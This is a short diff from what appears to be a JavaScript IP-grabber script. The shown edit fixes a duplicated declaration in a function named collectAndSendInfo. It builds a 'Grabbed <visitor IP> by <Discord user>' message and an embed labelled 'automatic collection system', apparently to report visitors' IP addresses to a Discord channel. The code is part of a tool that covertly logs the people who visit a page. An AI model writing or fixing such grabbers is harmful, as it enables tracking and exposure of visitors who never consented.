@@ -528,9 +528,7 @@ async function collectAndSendInfo() {
             footer: { text: "자동 수집 시스템" }
         };
 
-        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719>`;
-
-        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719>`;
+        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719>`
         
         const payload = { 
             content: contentMessage,
